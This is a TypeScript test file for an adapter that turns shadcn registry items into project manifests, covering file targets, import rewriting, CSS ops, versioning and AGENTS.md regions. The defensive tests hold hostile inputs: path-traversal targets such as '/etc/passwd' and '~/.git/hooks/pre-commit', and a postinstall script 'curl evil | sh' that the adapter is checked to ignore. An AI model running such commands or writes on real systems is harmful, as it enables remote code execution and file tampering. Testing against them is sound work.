import { expect, test } from "bun:test";
import { parseManifest } from "@aokit/module";
import { errorCodeExitCodes } from "../../src/cli/exit-codes.ts";
import { type EngineContext, type EngineModule, Vfs, buildPlan } from "../../src/engine/index.ts";
import { lockfileSchema } from "../../src/lockfile/schema.ts";
import { RegistryError } from "../../src/registry/errors.ts";
import { adaptShadcnItem, type AdaptedModule } from "../../src/registry/shadcn/adapt.ts";
import {
  shadcnItemSchema,
  shadcnRegistrySchema,
  type ShadcnItem,
} from "../../src/registry/shadcn/schema.ts";
import { parseRegions } from "../../src/patchers/markdown/regions.ts";
import { resolve } from "../../src/resolver/resolve.ts";

const context: EngineContext = { now: new Date(0), random: () => 0.5, env: {} };
const scope = { scope: "shadcn" };

function item(raw: Record<string, unknown>): ShadcnItem {
  return shadcnItemSchema.parse({ name: "button", type: "registry:ui", ...raw });
}

function file(path: string, content = "export {};\n", target?: string) {
  return { path, type: "registry:ui", content, ...(target === undefined ? {} : { target }) };
}

function adapt(raw: Record<string, unknown>): AdaptedModule {
  return adaptShadcnItem(item(raw), scope);
}

function failure(run: () => unknown): RegistryError {
  try {
    run();
  } catch (error) {
    if (error instanceof RegistryError) return error;
    throw error;
  }
  throw new Error("expected a RegistryError");
}

function destinations(adapted: AdaptedModule): string[] {
  return adapted.manifest.files.map((entry) => `${entry.target}:${entry.to}`);
}

function engineModule(adapted: AdaptedModule): EngineModule {
  return {
    manifest: adapted.manifest,
    readFile(from) {
      const content = adapted.files.get(from);
      if (content === undefined) throw new Error(`missing ${from}`);
      return content;
    },
  };
}

const stylingProvider: EngineModule = {
  manifest: parseManifest({ name: "tailwind4", version: "1.0.0", provides: ["styling"] }),
  readFile() {
    throw new Error("no files");
  },
};

async function render(adapted: AdaptedModule, layout: "single" | "monorepo", base: Vfs) {
  const plan = await buildPlan({
    modules: [stylingProvider, engineModule(adapted)],
    layout,
    answers: {},
    context,
    base,
  });
  return plan.vfs;
}

const typeCases: [string, Record<string, unknown>, string[]][] = [
  [
    "ui",
    { type: "registry:ui", files: [file("registry/ui/button.tsx")] },
    ["shared-ui:ui/button.tsx"],
  ],
  [
    "component",
    { type: "registry:component", files: [file("registry/c/card.tsx")] },
    ["shared-ui:components/card.tsx"],
  ],
  [
    "block",
    { type: "registry:block", files: [file("a/page.tsx"), file("a/x.tsx", "", "src/x.tsx")] },
    ["web:page.tsx", "web:src/x.tsx"],
  ],
  [
    "page",
    { type: "registry:page", files: [file("a/p.tsx", "", "src/routes/p.tsx")] },
    ["web:src/routes/p.tsx"],
  ],
  [
    "hook",
    { type: "registry:hook", files: [file("hooks/use-mobile.ts")] },
    ["shared-ui:hooks/use-mobile.ts"],
  ],
  ["lib", { type: "registry:lib", files: [file("lib/utils.ts")] }, ["shared-ui:lib/utils.ts"]],
  [
    "file with target",
    { type: "registry:file", files: [file("x", "", "~/.config/x.json")] },
    ["root:.config/x.json"],
  ],
  [
    "file without target",
    { type: "registry:file", files: [file("a/.env.example")] },
    ["root:.env.example"],
  ],
  ["item", { type: "registry:item", files: [file("a/b.txt", "", "~/b.txt")] }, ["root:b.txt"]],
];

for (const [label, raw, expected] of typeCases) {
  test(`S6 maps a ${label} item to its Targets`, () => {
    expect(destinations(adapt(raw))).toEqual(expected);
  });
}

test("S6 theme and style items become CSS Ops and require styling; style also brings deps", () => {
  const theme = adapt({
    type: "registry:theme",
    cssVars: { light: { background: "white" } },
  });
  expect(theme.manifest.ops.slice(0, -1)).toEqual([
    {
      op: "addCssVariables",
      target: "web",
      file: "src/styles.css",
      group: "light",
      variables: { "--background": "white" },
    },
  ]);
  expect(theme.manifest.requires).toEqual(["styling"]);
  const style = adapt({
    type: "registry:style",
    css: { '@plugin "tw-animate"': {} },
    dependencies: ["tw-animate-css"],
  });
  expect(style.manifest.ops[0]).toMatchObject({ op: "addCssAtRule", rule: "plugin" });
  expect(style.manifest.deps?.dependencies).toEqual({ "tw-animate-css": { range: "*" } });
  expect(adapt({ type: "registry:theme" }).manifest.requires).toEqual(["styling"]);
});

for (const type of ["registry:font", "registry:base"]) {
  test(`S6 ${type} fails with REGISTRY_ITEM_UNSUPPORTED naming the item and writes nothing`, () => {
    const error = failure(() => adapt({ name: "inter", type, files: [file("a.css")] }));
    expect(error.code).toBe("REGISTRY_ITEM_UNSUPPORTED");
    expect(error.message).toContain('"inter"');
    expect(error.data.module).toBe("inter");
    expect(errorCodeExitCodes.REGISTRY_ITEM_UNSUPPORTED).toBe(1);
  });
}

test("S6 an unknown type fails naming the item", () => {
  const error = failure(() => adapt({ name: "weird", type: "registry:widget" }));
  expect(error.code).toBe("REGISTRY_ITEM_UNSUPPORTED");
  expect(error.message).toContain('"weird"');
});

test("S7 alias placeholders resolve to Targets", () => {
  const adapted = adapt({
    type: "registry:file",
    files: [
      file("a", "", "@components/card.tsx"),
      file("b", "", "@ui/button.tsx"),
      file("c", "", "@lib/utils.ts"),
      file("d", "", "@hooks/use-x.ts"),
      file("e", "", "~/tsconfig.json"),
    ],
  });
  expect(destinations(adapted)).toEqual([
    "shared-ui:components/card.tsx",
    "shared-ui:ui/button.tsx",
    "shared-ui:lib/utils.ts",
    "shared-ui:hooks/use-x.ts",
    "root:tsconfig.json",
  ]);
});

test("S7 an unknown placeholder fails naming the item and the placeholder", () => {
  const error = failure(() =>
    adapt({ name: "card", type: "registry:file", files: [file("a", "", "@weird/x.ts")] }),
  );
  expect(error.code).toBe("REGISTRY_ITEM_UNSUPPORTED");
  expect(error.message).toContain('"card"');
  expect(error.message).toContain("@weird/");
});

const importingItem = {
  name: "dialog",
  type: "registry:ui",
  files: [
    file(
      "ui/dialog.tsx",
      'import { cn } from "@lib/utils";\nimport { Button } from "@ui/button";\nimport { useX } from \'@hooks/use-x\';\nimport { Slot } from "@radix-ui/react-slot";\n',
    ),
    file("lib/utils.ts", "export const cn = 1;\n", "@lib/utils.ts"),
    file("ui/button.tsx", "export const Button = 1;\n"),
    file("hooks/use-x.ts", "export const useX = 1;\n", "@hooks/use-x.ts"),
  ],
};

function resolvesTo(vfs: Vfs, from: string, specifier: string): boolean {
  const parts = from.split("/").slice(0, -1);
  for (const segment of specifier.split("/")) {
    if (segment === "..") parts.pop();
    else if (segment !== ".") parts.push(segment);
  }
  const base = parts.join("/");
  return vfs.has(`${base}.ts`) || vfs.has(`${base}.tsx`);
}

for (const [layout, root] of [
  ["single", "src/components"],
  ["monorepo", "packages/ui"],
] as const) {
  test(`S7 imports are rewritten so they resolve on the ${layout} Layout`, async () => {
    const adapted = adapt(importingItem);
    const vfs = await render(adapted, layout, Vfs.empty());
    const path = `${root}/ui/dialog.tsx`;
    const text = String(vfs.read(path));
    expect(text).toContain('from "../lib/utils"');
    expect(text).toContain('from "./button"');
    expect(text).toContain("from '../hooks/use-x'");
    expect(text).toContain('"@radix-ui/react-slot"');
    for (const specifier of ["../lib/utils", "./button", "../hooks/use-x"]) {
      expect(resolvesTo(vfs, path, specifier)).toBe(true);
    }
  });
}

const crossTargetItem = {
  name: "page-x",
  type: "registry:block",
  files: [
    file(
      "p.tsx",
      'import { Button } from "@ui/button";\nimport { cn } from "@lib/utils";\n',
      "src/p.tsx",
    ),
    file("ui/button.tsx", "export const Button = 1;\n", "@ui/button.tsx"),
    file("lib/utils.ts", "export const cn = 1;\n", "@lib/utils.ts"),
  ],
};

for (const [layout, web, ui] of [
  ["single", "src/p.tsx", "src/components"],
  ["monorepo", "apps/web/src/p.tsx", "packages/ui"],
] as const) {
  test(`S7 an import across Targets resolves on the ${layout} Layout`, async () => {
    const vfs = await render(adapt(crossTargetItem), layout, Vfs.empty());
    const text = String(vfs.read(web));
    expect(text).not.toContain("{{import:");
    const specifiers = [...text.matchAll(/from "([^"]+)"/g)].map((match) => match[1] ?? "");
    expect(specifiers).toHaveLength(2);
    for (const specifier of specifiers) {
      expect(specifier.startsWith(".")).toBe(true);
      expect(resolvesTo(vfs, web, specifier)).toBe(true);
    }
    expect(vfs.has(`${ui}/ui/button.tsx`)).toBe(true);
  });
}

for (const [label, path, target] of [
  ["a parent segment in the target", "a.ts", "../escape.ts"],
  ["an absolute target", "a.ts", "/etc/passwd"],
  ["a parent segment after ~/", "a.ts", "~/../escape.ts"],
  ["a parent segment after an alias", "a.ts", "@ui/../../escape.ts"],
  ["a backslash", "a.ts", "src\\..\\escape.ts"],
  ["a parent segment in the path", "../../a.ts", undefined],
  ["an absolute path", "/etc/passwd", undefined],
  ["a .git segment after ~/", "a.ts", "~/.git/config"],
  ["a .git hooks directory", "a.ts", "~/.git/hooks/pre-commit"],
  ["a node_modules segment", "a.ts", "~/node_modules/x/index.js"],
] as const) {
  test(`item paths that escape their Target are rejected: ${label}`, () => {
    const error = failure(() => adapt({ type: "registry:file", files: [file(path, "x", target)] }));
    expect(error.code).toBe("REGISTRY_PATH_UNSAFE");
    expect(error.data.module).toBe("button");
  });
}

test("an unknown @/ placeholder in file content fails naming the item and placeholder", () => {
  const error = failure(() =>
    adapt({
      type: "registry:ui",
      files: [file("ui/button.tsx", 'import { cn } from "@/lib/utils";\n')],
    }),
  );
  expect(error.code).toBe("REGISTRY_ITEM_UNSUPPORTED");
  expect(error.message).toContain('"button"');
  expect(error.message).toContain('"@/"');
});

test("S8 cssVars, css, envVars, deps and embedded content map onto the manifest", () => {
  const adapted = adapt({
    type: "registry:ui",
    files: [file("ui/button.tsx", "export const a = 1;\n")],
    dependencies: ["@radix-ui/react-slot@^1.1.0", "clsx"],
    devDependencies: ["typescript@~5.4.0"],
    cssVars: {
      theme: { "--font-x": "Inter" },
      light: { primary: "red" },
      dark: { primary: "blue" },
    },
    css: { '@plugin "@tailwindcss/typography"': {}, "@theme": { "--color-a": "red" } },
    envVars: { API_URL: "http://localhost" },
  });
  const { manifest } = adapted;
  expect(manifest.deps?.dependencies).toEqual({
    "@radix-ui/react-slot": { range: "^1.1.0" },
    clsx: { range: "*" },
  });
  expect(manifest.deps?.devDependencies).toEqual({ typescript: { range: "~5.4.0" } });
  expect(manifest.env).toEqual([{ key: "API_URL", scope: "web", example: "http://localhost" }]);
  expect(manifest.ops.map((op) => op.op)).toEqual([
    "addCssVariables",
    "addCssVariables",
    "addCssVariables",
    "addCssAtRule",
    "addCssAtRule",
    "appendRegion",
  ]);
  expect(manifest.ops[1]).toMatchObject({ group: "light", variables: { "--primary": "red" } });
  expect(manifest.ops[3]).toMatchObject({ rule: "plugin", params: '"@tailwindcss/typography"' });
  expect(manifest.ops[4]).toMatchObject({ rule: "theme", body: "--color-a: red;" });
  expect(adapted.files.get("files/shared-ui/ui/button.tsx")).toBe("export const a = 1;\n");
  expect(manifest.requires).toEqual(["styling"]);
  expect(manifest.migrations).toEqual([]);
});

test("S8 an item with css fields fails to resolve without the styling Capability", () => {
  const adapted = adapt({ type: "registry:ui", cssVars: { light: { primary: "red" } } });
  const result = resolve({ modules: [adapted.manifest.name] }, [adapted.manifest]);
  expect(result.ok).toBe(false);
  if (result.ok) return;
  expect(result.error.code).toBe("requirement_unmet");
  expect(result.error.message).toContain('"styling"');
  const plain = adapt({ type: "registry:ui", files: [file("ui/button.tsx")] });
  expect(plain.manifest.requires).toEqual([]);
  expect(resolve({ modules: [plain.manifest.name] }, [plain.manifest]).ok).toBe(true);
});

for (const [layout, stylesheet] of [
  ["single", "src/styles.css"],
  ["monorepo", "apps/web/src/styles.css"],
] as const) {
  test(`S8 cssVars and css apply to the stylesheet on the ${layout} Layout`, async () => {
    const adapted = adapt({
      type: "registry:theme",
      cssVars: { light: { primary: "red" } },
      css: { '@plugin "x"': {} },
    });
    const base = Vfs.empty();
    base.write(stylesheet, '@import "tailwindcss";\n');
    const text = String((await render(adapted, layout, base)).read(stylesheet));
    expect(text).toContain("--primary: red");
    expect(text).toContain('@plugin "x"');
  });
}

test("S8 plain css rules map to nested at-rule Ops and are idempotent", async () => {
  const adapted = adapt({
    type: "registry:style",
    css: {
      "@layer base": { "*": { "@apply border-border": {} }, body: { "@apply bg-background": {} } },
      "@utility tab-4": { "tab-size": "4" },
    },
  });
  const rules = adapted.manifest.ops.map((op) => (op.op === "addCssAtRule" ? op.rule : op.op));
  expect(rules).toEqual(["layer", "utility", "appendRegion"]);
  const base = Vfs.empty();
  base.write("src/styles.css", '@import "tailwindcss";\n');
  const once = String((await render(adapted, "single", base)).read("src/styles.css"));
  expect(once).toContain("@layer base");
  expect(once).toContain("@apply border-border;");
  expect(once).toContain("@utility tab-4");
  expect(once).toContain("tab-size: 4");
  const again = Vfs.empty();
  again.write("src/styles.css", once);
  expect(String((await render(adapted, "single", again)).read("src/styles.css"))).toBe(once);
});

test("S9 names, versions, integrity and ownership", () => {
  const first = adapt({ type: "registry:ui", files: [file("ui/button.tsx")] });
  expect(first.manifest.name).toBe("@shadcn/button");
  expect(first.version).toMatch(/^0\.0\.0-shadcn\.[0-9a-f]{12}$/);
  expect(first.manifest.version).toBe(first.version);
  expect(first.integrity).toMatch(/^sha256-[0-9a-f]{64}$/);
  expect(first.manifest.files.every((entry) => entry.ownership === "managed")).toBe(true);

  const same = adapt({ type: "registry:ui", files: [file("ui/button.tsx")] });
  expect(same.version).toBe(first.version);
  expect(same.integrity).toBe(first.integrity);
  const changed = adapt({ type: "registry:ui", files: [file("ui/button.tsx", "changed")] });
  expect(changed.version).not.toBe(first.version);
  expect(changed.integrity).not.toBe(first.integrity);

  for (const type of ["registry:page", "registry:file"]) {
    const seeded = adapt({ type, files: [file("a/x.txt", "", "~/x.txt")] });
    expect(seeded.manifest.files[0]?.ownership).toBe("seed");
  }
});

test("S9 a git source versions by its commit SHA and an unscoped Registry uses its key as scope", () => {
  const sha = "0123456789abcdef0123456789abcdef01234567";
  const adapted = adaptShadcnItem(item({}), { scope: "@acme", sourceSha: sha });
  expect(adapted.version).toBe("0.0.0-shadcn.0123456789ab");
  expect(adapted.manifest.name).toBe("@acme/button");
  const keyed = adaptShadcnItem(item({}), { scope: "my-registry" });
  expect(keyed.manifest.name).toBe("@my-registry/button");
});

test("extra item fields never change the result or trust", () => {
  const clean = adapt({ files: [file("ui/button.tsx")] });
  const noisy = adapt({
    files: [{ ...file("ui/button.tsx"), trusted: true }],
    trusted: true,
    registry: { trusted: true },
    scripts: { postinstall: "curl evil | sh" },
  });
  expect(noisy.version).toBe(clean.version);
  expect(noisy.integrity).toBe(clean.integrity);
  expect(noisy.manifest).toEqual(clean.manifest);
  expect(JSON.stringify(noisy.manifest)).not.toContain("trusted");
});

test("the registry and item schemas read only what the adapter needs", () => {
  const registry = shadcnRegistrySchema.parse({
    name: "acme",
    extra: 1,
    items: [{ name: "button", type: "registry:ui", files: [] }],
  });
  expect(registry.items).toEqual([{ name: "button", type: "registry:ui" }]);
  expect(shadcnItemSchema.safeParse({ type: "registry:ui" }).success).toBe(false);
});

test("scoped names are accepted only for Adapted Modules", () => {
  const adapted = adapt({});
  expect(parseManifest(adapted.manifest).name).toBe("@shadcn/button");
  expect(() => parseManifest({ name: "@shadcn/button", version: "1.0.0" })).toThrow(/Adapted/);
  expect(() => parseManifest({ name: "button", version: "1.0.0" })).not.toThrow();

  const lockfile = (name: string, version: string) =>
    lockfileSchema.safeParse({
      $schema: "x",
      lockfileVersion: 2,
      cliVersion: "1.0.0",
      protocolVersion: 1,
      layout: "single",
      registries: {},
      modules: {
        [name]: {
          version,
          registry: "shadcn",
          selected: true,
          integrity: adapted.integrity,
          answers: {},
        },
      },
      files: {},
      deps: {},
    }).success;
  expect(lockfile("@shadcn/button", adapted.version)).toBe(true);
  expect(lockfile("@shadcn/button", "1.0.0")).toBe(false);
  expect(lockfile("button", "1.0.0")).toBe(true);
});

const registrySource = "https://ui.acme.dev/r/registry.json";

function agentsRegionOp(adapted: AdaptedModule) {
  const op = adapted.manifest.ops.find((entry) => entry.op === "appendRegion");
  if (op?.op !== "appendRegion") throw new Error("expected an appendRegion Op");
  return op;
}

test("S6 an Adapted Module appends its agents Region with name, type, files and source", () => {
  const adapted = adaptShadcnItem(
    item({ type: "registry:ui", files: [file("registry/ui/button.tsx")] }),
    { scope: "@acme", source: registrySource },
  );
  const op = agentsRegionOp(adapted);
  expect(op).toMatchObject({ target: "root", file: "AGENTS.md", region: "agents" });
  const content = op.content;
  expect(content).toContain("@acme/button");
  expect(content).toContain("`ui`");
  expect(content).toContain("`ui/button.tsx`");
  expect(content).toContain(registrySource);
});

test("S6 the Region content depends on the Registry source", () => {
  const without = adapt({ files: [file("ui/button.tsx")] });
  const withSource = adaptShadcnItem(item({ files: [file("ui/button.tsx")] }), {
    ...scope,
    source: registrySource,
  });
  expect(withSource.integrity).not.toBe(without.integrity);
});

test("S6 adding then removing an item leaves AGENTS.md equal to a fresh Render without it", async () => {
  const adapted = adaptShadcnItem(item({ files: [file("ui/button.tsx")] }), {
    scope: "@acme",
    source: registrySource,
  });
  const withoutPlan = await buildPlan({
    modules: [stylingProvider],
    layout: "single",
    answers: {},
    context,
    base: Vfs.empty(),
  });
  const fresh = withoutPlan.vfs.read("AGENTS.md");
  const added = String(
    (
      await buildPlan({
        modules: [stylingProvider, engineModule(adapted)],
        layout: "single",
        answers: {},
        context,
        base: Vfs.empty(),
      })
    ).vfs.read("AGENTS.md"),
  );
  expect(added).toContain("<!-- aokit:begin @acme/button:agents -->");
  expect(added).toContain("<!-- aokit:end @acme/button:agents -->");
  const removed = await buildPlan({
    modules: [stylingProvider],
    layout: "single",
    answers: {},
    context,
    base: Vfs.empty(),
  });
  expect(removed.vfs.read("AGENTS.md")).toEqual(fresh);
});

test("S6 a name with @ and / produces a Region that parses back to the same id", async () => {
  const adapted = adaptShadcnItem(item({ files: [file("ui/button.tsx")] }), {
    scope: "@acme",
    source: registrySource,
  });
  const text = String(
    (
      await buildPlan({
        modules: [stylingProvider, engineModule(adapted)],
        layout: "single",
        answers: {},
        context,
        base: Vfs.empty(),
      })
    ).vfs.read("AGENTS.md"),
  );
  expect(parseRegions(text).map((region) => region.id)).toContain("@acme/button:agents");
});
